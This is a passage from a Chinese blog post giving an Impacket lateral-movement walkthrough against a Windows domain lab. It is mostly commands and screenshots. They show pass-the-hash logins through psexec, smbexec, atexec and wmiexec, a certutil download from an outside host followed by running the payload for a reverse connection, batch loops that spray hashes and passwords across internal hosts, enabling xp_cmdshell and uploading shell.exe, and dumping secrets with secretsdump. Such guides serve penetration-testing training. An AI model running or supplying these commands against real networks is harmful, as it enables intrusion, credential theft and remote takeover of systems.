+<p><img src="images/image-20210903222718195.png" alt="image-20210903222718195"></p>
+<h4 id="远程加载可执行程序">远程加载可执行程序</h4>
+<p>下面使用&quot;-c&quot;参数远程加载可执行程序，使目标主机反向回连。artifact.exe放到与psexec.py相同目录。</p>
+<pre><code>python3 psexec.py ./administrator:123456@10.10.10.120 -c artifact.exe
+</code></pre>
+<p><img src="images/image-20210903223312009.png" alt="image-20210903223312009"></p>
+<p>如下图，目标主机已正常回连，由于目标主机是双网卡主机，显示内网ip为另外一块网卡的ip。</p>
+<p><img src="images/image-20210903223325833.png" alt="image-20210903223325833"></p>
+<h3 id="smbexe">smbexe</h3>
+<p>smbexe为全交互式工具，所以不可用于webshell环境，可用于rdp等有交互环境登录使用或socks代理环境下使用。</p>
+<h4 id="本地账号密码认证-1">本地账号密码认证</h4>
+<pre><code>python3 smbexec.py ./administrator:123456@10.10.10.120
+</code></pre>
+<p><img src="images/image-20210903223845410.png" alt="image-20210903223845410"></p>
+<h4 id="ntlm-hash认证-1">NTLM hash认证</h4>
+<pre><code>python3 smbexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120
+</code></pre>
+<p><img src="images/image-20210903224235627.png" alt="image-20210903224235627"></p>
+<h4 id="域管账号密码认证-1">域管账号密码认证</h4>
+<pre><code>python3 smbexec.py adlab/administrator:123456@10.10.10.250
+</code></pre>
+<p><img src="images/image-20210903224304607.png" alt="image-20210903224304607"></p>
+<h4 id="域内使用ntlm-hash认证对远程主机-1">域内使用NTLM hash认证对远程主机</h4>
+<pre><code>python3 smbexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/administrator@10.10.10.250
+</code></pre>
+<p><img src="images/image-20210903224321671.png" alt="image-20210903224321671"></p>
+<h3 id="smbclientpy">smbclient.py</h3>
+<p>有时候，我们需要在攻击者计算机和目标计算机之间执行多项操作，那么 s mbclien.py 足够满足我们的所需，它可以列出共享和文件，重命名某些文 件，上传二进制文件或从目标计算机下载文件。</p>
+<p>句法： smbclient.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址]</p>
+<h4 id="本地账号验证">本地账号验证</h4>
+<pre><code>python3 smbclient.py ./Administrator:123456@10.10.10.120
+
+use c$
+put c:\xxxx.exe    上传
+get xxx.exe        c盘的相对路径，下载到当前文件夹内
+</code></pre>
+<p><img src="images/image-20210903232246379.png" alt="image-20210903232246379"></p>
+<p>成功上传到C盘</p>
+<p><img src="images/image-20210903232522786.png" alt="image-20210903232522786"></p>
+<p>下载</p>
+<p><img src="images/image-20210903232641500.png" alt="image-20210903232641500"></p>
+<p><img src="images/image-20210903232650368.png" alt="image-20210903232650368"></p>
+<h4 id="ntlm-hash进行验证">NTLM HASH进行验证</h4>
+<pre><code>python3 smbclient.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120
+</code></pre>
+<p><img src="images/image-20210903232457341.png" alt="image-20210903232457341"></p>
+<p>我们将连接到目标计算机，并且我们有了一个 smb shell，它可以运行各 种命令，例如 dir，cd，pwd，put，rename，更多，del，rm，mkdir，rmdir， 信息等</p>
+<h3 id="atexec">atexec</h3>
+<p>atexec是通过windows计划任务执行远程命令，atexec是一个半交互的工具，即参数中添加需要在远程主机执行的命令，工具执行后即返回命令结果，适用于webshell下，也适用于其他网络环境。</p>
+<h4 id="本地账号密码认证-2">本地账号密码认证</h4>
+<pre><code>python3 atexec.py ./administrator:123456@10.10.10.120 &quot;whoami&quot;
+</code></pre>
+<p><img src="images/image-20210903105935617.png" alt="image-20210903105935617"></p>
+<h4 id="ntlm-hash认证-2">NTLM hash认证</h4>
+<pre><code>python3 atexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120 &quot;whoami&quot;
+</code></pre>
+<p><img src="images/image-20210903110144906.png" alt="image-20210903110144906"></p>
+<h4 id="域管帐户密码认证">域管帐户密码认证</h4>
+<pre><code>python3 atexec.py adlab/administrator:123456@10.10.10.120 &quot;certutil -urlcache -split -f http://10x.xx.xx.x7:8080/lib8.py&quot; 
+</code></pre>
+<p>在linux主机下，使用proxychains代理工具，使用atexec远程执行该程序，使主机反向回连
+*<strong>注意此处，123456密码中的&quot;!&ldquo;需要转义，否则会报错。*</strong></p>
+<pre><code>proxychains python3 atexec.py adlab/administrator:admin\!@#45@10.10.10.120 &quot;lib8.py&quot;
+</code></pre>
+<h4 id="域内使用ntlm-hash认证对远程主机-2">域内使用NTLM hash认证对远程主机</h4>
+<pre><code>python3 atexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/administrator@10.10.10.120 &quot;whoami&quot;
+</code></pre>
+<p><img src="images/image-20210903224610304.png" alt="image-20210903224610304"></p>
+<p>由此可以写一些简单bat脚本，如批量对内网机器遍历做hash传递验证、指定主机ntlm hash遍历验证、内网机器遍历做密码验证、指定主机密码遍历验证。</p>
+<pre><code>内网机器遍历做hash传递验证,ips.txt内容为内网ip，每段一条 
+FOR /F %%i in (ips.txt) do atexec.py -hashes :DF92E298362E3E180EC0EE7226AFB821 ./administrator@%%i  whoami 
+
+指定主机ntlm hash遍历验证，hashes.txt为已知ntlm hash内容，每段一条
+FOR /F %%i in (hashes.txt) do atexec.py -hashes %%i ./administrator@10.10.10.120  whoami  
+
+内网机器遍历做密码验证，passwords.txt为已知密码内容，每段一条
+FOR /F %%i in (passwords.txt) do atexec.py  ./administrator:%%i@10.10.10.120  whoami 
+
+指定主机密码遍历验证,ips.txt内容为内网ip，每段一条
+FOR /F %%i in (ips.txt) do atexec.py ./administrator:password123@%%i  whoami 
+</code></pre>
+<h3 id="wmiexec">wmiexec</h3>
+<p>wmiexec是一个即有全交互也有半交互的远程命令执行工具，可运用于多种环境，包括webshell环境、rdp环境、socks环境等。</p>
+<h4 id="本地账号密码认证-3">本地账号密码认证</h4>
+<pre><code>python3 wmiexec.py adlab/administrator:123456@10.10.10.120
+</code></pre>
+<p><img src="images/image-20210903224748473.png" alt="image-20210903224748473"></p>
+<h4 id="ntlm-hash认证-3">NTLM HASH认证</h4>
+<pre><code>python3 wmiexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./administrator@10.10.10.120
+</code></pre>
+<p><img src="images/image-20210903224805301.png" alt="image-20210903224805301"></p>
+<p>在linux主机下，使用proxychains代理工具，使用wmiexec对远程主机10.10.10.120执行命令</p>
+<pre><code>python3 wmiexec.py adlab/administrator:admin\!@#45@10.10.10.120
+</code></pre>
+<h3 id="samrdumppy">Samrdump.py</h3>
+<p>与MSRPC套件中的安全帐户管理器远程接口通信的应用程序。它将为我们列出目标系统上的用户帐户，可用资源共享以及通过此服务导出的其他敏感信息</p>
+<p><strong>语法:</strong> ./samrdump.py domain/] username : password] @] Target IP Address]</p>
+<pre><code>python3 samrdump.py ./Administrator:123456@10.10.10.120
+</code></pre>
+<p><img src="images/image-20210903233023403.png" alt="image-20210903233023403"></p>
+<h3 id="getst">getST</h3>
+<p>在ccache中输入密码，哈希，aesKey或TGT后，此脚本将请求服务票证并将其另存为ccache。如果该帐户具有受约束的委派（具有协议转换）权限，则可以使用-impersonate开关代表另一个用户请求票证。</p>
+<pre><code>python3 getST.py -spn cifs/liming-pc.adlaboffice.com -impersonate administrator -dc-ip 192.168.10.50 adlaboffice.com/evilcomputer$:123456
+</code></pre>
+<h3 id="secretsdump">secretsdump</h3>
+<p>执行各种技术以从远程计算机中转储秘密，而无需在该计算机上执行任何代理。对于SAM和LSA机密（包括缓存的凭据），我们尝试从注册表中读取尽可能多的内容，然后将配置单元保存在目标系统（％SYSTEMROOT％\ Temp目录）中，并从那里读取其余数据。对于DIT文件，我们使用DL_DRSGetNCChanges（）方法转储NTLM哈希，纯文本凭据（如果可用）和Kerberos密钥。它还可以通过使用smbexec / wmiexec方法执行的vssadmin转储NTDS.dit。如果脚本不可用，该脚本将启动其工作所需的服务（例如，即使已禁用，也应使用“远程注册表”）。工作完成后，一切恢复到原始状态。</p>
+<pre><code>python3 secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL
+</code></pre>
+<h3 id="mssqlclient">mssqlclient</h3>
+<p>一个MSSQL客户端，支持SQL和Windows身份验证（也有哈希）</p>
+<h4 id="windows认证">windows认证</h4>
+<pre><code>python3 mssqlclient.py ./administrator:123456@10.108.3.132 -windows-auth
+</code></pre>
+<h4 id="mssql账号密码认证的服务">mssql账号密码认证的服务</h4>
+<pre><code>python3 mssqlclient.py sa:123456@10.108.3.132
+
+enable_xp_cmdshell  开启xpcmdshell
+xp_cmdshell whoami  执行命令
+
+upload c:\shell.exe   c:\windows\temp\shell.exe
+upload  本地目录  远程目录
+</code></pre>
+<p>在windows环境下使用windows认证模式，使用ntlm hash验证方式，mssqlclient测试登录sqlserver服务器，账号验证成功后执行command.txt内的sql命令</p>
+<pre><code>python3 mssqlclient.py -p 1433 -hashes :dsfhsajfdsjbfsdfrootkit/sqladmin@192.168.3.73 -file command.txt -windows-auth
+</code></pre>
+<p>验证成功后执行mssql.txt内的sql语句</p>
+<pre><code>python3 mssqlclient.py domain/administrator@192.168.159.138 -windows-auth -file mssql.txt
+</code></pre>
+<h3 id="servicespy">services.py</h3>
+<p>Impacket 的服务脚本在 MSRPC Interface 的帮助下与 Windows 服务进行通 信。它可以启动，停止，删除，读取状态，配置，列出，创建和更改任何服务。</p>
+<p>句法： services.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址] 操 作]</p>
+<h4 id="本地账号验证-1">本地账号验证</h4>
+<pre><code>python3 services.py Administrator:123456@10.10.10.120 list
+</code></pre>
+<p><img src="images/image-20210903231502531.png" alt="image-20210903231502531"></p>
+<h4 id="ntlm-hash进行验证-1">NTLM HASH进行验证</h4>
+<pre><code>python3 services.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 ./Administrator@10.10.10.120 list
+</code></pre>
+<h3 id="opdumppy">opdump.py</h3>
+<p>该脚本绑定到给定的主机名：端口，并连接到 DCERPC（分布式计算环境/ 远程过程调用）接口。连接后，它将尝试依次调用前 256 个操作号中的每个操 作号，并报告每次调用的结果，这会生成与给定 host：port 的 TCP 连接信息。</p>
+<p>句法： opdump.py 目标 IP 地址] 端口接口版本]</p>
+<pre><code>python3 opdump.py 10.10.10.120 135 76F226C3-EC14-4325-8A99- 6A46348418AF v1.0
+</code></pre>
+<p><img src="images/image-20210903231557858.png" alt="image-20210903231557858"></p>
+<h3 id="rpcdumppy">rpcdump.py</h3>
+<p>RPC 或远程过程调用是指计算机程序使过程在不同的地址空间中执行时 （被编码为常规过程调用）。该脚本可以为我们枚举这些端点。</p>
+<p>句法： rpcdump.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址]</p>
+<h4 id="本地账号验证-2">本地账号验证</h4>
+<pre><code>python3 rpcdump.py adlab/Administrator:123456@10.10.10.250
+</code></pre>
+<p><img src="images/image-20210903231908480.png" alt="image-20210903231908480"></p>
+<h4 id="ntlm-hash进行验证-2">NTLM HASH进行验证</h4>
+<pre><code>python3 rpcdump.py -hashes :32196B56FFE6F45E294117B91A83BF38 adlab/Administrator@10.10.10.250
+</code></pre>
+<p><img src="images/image-20210903231948831.png" alt="image-20210903231948831"></p>
+<h3 id="lookupsid">lookupsid</h3>
+<p>安全标识符（SID）是可变长度的唯一值，用于标识用户帐户，通过 SID 用 户枚举，我们可以提取有关存在的用户及其数据的信息，Lookupsid 脚本可以 枚举本地和域用户。</p>
+<p>句法： lookupsid.py 域] / 用户]：密码/密码哈希] @ 目标 IP 地址]</p>
+<h4 id="本地账号验证-3">本地账号验证</h4>
+<pre><code>python3 lookupsid.py adlab/Administrator:123456@10.10.10.250 
+</code></pre>
+<p><img src="images/image-20210903232126221.png" alt="image-20210903232126221"></p>
+<h4 id="ntlm-hash进行验证-3">NTLM HASH进行验证</h4>
+<pre><code>python3 lookupsid.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 adlab/Administrator@10.10.10.250
+</code></pre>
+<p><img src="images/image-20210903232146269.png" alt="image-20210903232146269"></p>
+<p><img src="images/image-20210904005040226.png" alt="image-20210904005040226"></p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接: </strong>
+      <a href="https://ad-calcium.github.io/2021/09/impacket%E5%A5%97%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/" title="IMPACKET套件使用" target="_blank" rel="external">https://ad-calcium.github.io/2021/09/impacket%E5%A5%97%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License: </strong>
+        <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/ad-calcium" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://ad-calcium.github.io/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/ad-calcium" target="_blank"><span class="text-dark">AD钙奶</span><small class="ml-1x"></small></a></h3>
+        <div>Good Good Study, Day Day Up~</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+    </div>
+  </article>
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://ad-calcium.github.io/2021/09/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" title="内网穿透工具的使用"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;下一篇</span></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="文章目录" role="button">
+                    <span>[&nbsp;</span><span>文章目录</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter"
+                data-mobile-sites="weibo,qq,qzone"></div>
+        </div>
+    </div>
+</nav>
+
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+  <div class="copyright">
+    &copy;2020  -
+    2021
+
+    
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://ad-calcium.github.io/js/application.min.a94ab19cb63a95c8d7fbd7b85cab3ddeea8c369bdf75b9cab6708787ead123af.js"></script>
+<script src="https://ad-calcium.github.io/js/plugin.min.19c5bcb2fb0789ab4f2b7834e5ceb5e92635645605bab902c1024b25f1502364.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(未命名)',
+            },
+            ROOT_URL: 'https:\/\/ad-calcium.github.io\/',
+            CONTENT_URL: 'https:\/\/ad-calcium.github.io\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://ad-calcium.github.io/js/insight.min.4a2d52de4bfff73e0c688404fe3d17c9a3ae12d9888e1e1ac9c690e4890de2ded50fe55f2b819c2ba55435a76f396f3ea6805765f0b0af5635cdf74ea459eab0.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
